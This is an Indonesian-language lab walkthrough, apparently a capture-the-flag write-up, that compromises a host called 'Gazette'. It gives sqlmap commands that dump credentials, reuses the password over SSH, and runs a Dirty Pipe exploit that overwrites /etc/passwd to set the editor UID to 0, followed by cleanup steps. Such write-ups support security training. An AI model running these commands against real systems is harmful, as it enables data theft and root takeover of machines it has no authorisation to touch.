# Write-Up Singkat Privilege Escalation Gazette
> **Versi Closed Book — Command Inti Mudah Dihafal**

## Target

```text
http://192.168.56.121:8000
```

## Rantai Serangan

```text
SQL Injection
→ Dump kredensial
→ Password reuse ke SSH
→ Foothold sebagai editor
→ Dirty Pipe
→ UID editor menjadi 0
→ Root
```

## Mnemonik

```text
S-D-S-K-U-R
```

- **S** = SQL Injection
- **D** = Dump user
- **S** = SSH
- **K** = Kernel check
- **U** = Ubah UID
- **R** = Root

---

# 1. Verifikasi SQL Injection

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" \
  -p id \
  --batch \
  --technique=U
```

Indikator berhasil:

```text
Parameter id injectable
UNION query
7 columns
MariaDB/MySQL
```

---

# 2. Enumerasi Database

## Lihat database

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" --dbs
```

Hasil penting:

```text
gazette
```

## Lihat tabel

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" \
  -D gazette \
  --tables
```

Hasil:

```text
news
users
```

---

# 3. Dump Kredensial

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" \
  -D gazette \
  -T users \
  --dump
```

Kredensial yang ditemukan:

```text
Username : editor
Password : password123
```

---

# 4. Login SSH

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

Verifikasi:

```bash
id
```

Hasil awal:

```text
uid=1001(editor) gid=1001(editor)
```

---

# 5. Cek Sudo dan Kernel

## Cek sudo

```bash
sudo -l
```

Hasil:

```text
editor may not run sudo
```

## Cek kernel

```bash
cat /proc/version
```

Hasil penting:

```text
Linux 5.10.70-1
```

Kernel tersebut rentan terhadap **Dirty Pipe**.

---

# 6. Siapkan Backup

```bash
cp /etc/passwd ~/passwd.bak
sha256sum /etc/passwd ~/passwd.bak
```

Hash harus sama.

---

# 7. Kompilasi PoC Dirty Pipe

Gunakan source `dirtypipe.c` yang telah disiapkan.

```bash
gcc -O2 dirtypipe.c -o dirtypipe
```

Uji pada file biasa:

```bash
printf 'ABCDEFGH\n' > dp-test
chmod 444 dp-test
./dirtypipe dp-test 1 Z
cat dp-test
```

Hasil:

```text
AZCDEFGH
```

Artinya Dirty Pipe bekerja.

---

# 8. Cari Offset User `editor`

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

Hasil:

```text
2183:editor:x:1001:1001
```

Offset UID:

```text
2183 + 9 = 2192
```

---

# 9. Ubah UID Menjadi 0

```bash
./dirtypipe /etc/passwd 2192 0000
```

Verifikasi:

```bash
grep '^editor:' /etc/passwd
```

Hasil:

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

---

# 10. Menjadi Root

Jangan logout dari sesi lama.

```bash
su - editor
```

Masukkan:

```text
password123
```

Verifikasi:

```bash
id
```

Hasil akhir:

```text
uid=0(root) gid=1001(editor)
```

Privilege escalation berhasil.

---

# 11. Pemulihan

Setelah bukti root diperoleh:

```bash
install -o root -g root -m 0644 \
  /home/editor/passwd.bak \
  /etc/passwd
```

Verifikasi:

```bash
grep '^editor:' /etc/passwd
```

Hasil normal:

```text
editor:x:1001:1001::/home/editor:/bin/bash
```

Hapus file pengujian:

```bash
rm -f ~/dirtypipe ~/dirtypipe.c ~/dp-test
```

---

# Ringkasan Super Singkat

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" --dbs
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" -D gazette --tables
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" -D gazette -T users --dump

ssh editor@192.168.56.121
# password123

cat /proc/version
cp /etc/passwd ~/passwd.bak
gcc -O2 dirtypipe.c -o dirtypipe
grep -bo 'editor:x:1001:1001' /etc/passwd
./dirtypipe /etc/passwd 2192 0000
su - editor
id
```

---

# Kesimpulan

Kerentanan SQL Injection memungkinkan pengambilan kredensial akun `editor`. Password aplikasi digunakan kembali pada akun SSH Linux. Setelah login sebagai `editor`, kernel Debian `5.10.70-1` dieksploitasi menggunakan Dirty Pipe untuk mengubah UID akun `editor` menjadi `0`. Perintah `su - editor` kemudian menghasilkan shell dengan hak root.
